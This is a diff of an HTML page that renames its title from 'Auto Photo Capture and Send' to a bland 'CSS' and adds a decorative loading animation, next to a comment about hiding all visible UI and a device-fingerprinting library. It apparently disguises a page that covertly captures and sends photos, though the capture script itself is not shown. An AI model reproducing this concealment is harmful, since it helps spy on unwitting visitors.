@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Photo Capture and Send</title>
+    <title>CSS</title>
     <style>
         body {
             display: flex; /* Hide the entire body to ensure no UI elements are visible */
@@ -104,6 +104,73 @@
     top: 100%;
   }
 }
+.sqr {
+  position: absolute;
+  left: 45%;
+  top: 45%;
+  background-color: white;
+  width: 20px;
+  height: 20px;
+  margin-top: -5px;
+  margin-left: -5px;
+}
+
+#k1 {
+  animation: loader 675ms ease-in-out 150ms infinite;
+}
+
+#k2 {
+  margin-left: 25px;
+  animation: loader 675ms ease-in-out 225ms infinite;
+}
+
+#k3 {
+  margin-left: 55px;
+  animation: loader 675ms ease-in-out 300ms infinite;
+}
+
+#k4 {
+  margin-top: 25px;
+  animation: loader 675ms ease-in-out 375ms infinite;
+}
+
+#k5 {
+  margin-top: 25px;
+  margin-left: 25px;
+  animation: loader 675ms ease-in-out 450ms infinite;
+}
+
+#k6 {
+  margin-top: 25px;
+  margin-left: 55px;
+  animation: loader 675ms ease-in-out 525ms infinite;
+}
+
+#k7 {
+  margin-top: 55px;
+  animation: loader 675ms ease-in-out 600ms infinite;
+}
+
+#k8 {
+  margin-top: 55px;
+  margin-left: 25px;
+  animation: loader 675ms ease-in-out 675ms infinite;
+}
+
+#k9 {
+  margin-top: 55px;
+  margin-left: 55px;
+  animation: loader 675ms ease-in-out 750ms infinite;
+}
+
+@keyframes loader {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
 
     </style>
 </head>
@@ -123,6 +190,17 @@
         <div class="ball ball--3"></div>
         <div class="ball ball--4"></div>
     </div>
+        <div class="loader">
+  <div class="sqr" id="k1"></div>
+  <div class="sqr" id="k2"></div>
+  <div class="sqr" id="k3"></div>
+  <div class="sqr" id="k4"></div>
+  <div class="sqr" id="k5"></div>
+  <div class="sqr" id="k6"></div>
+  <div class="sqr" id="k7"></div>
+  <div class="sqr" id="k8"></div>
+  <div class="sqr" id="k9"></div>
+</div>
 </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"></script>
     <script src="script.js"></script>
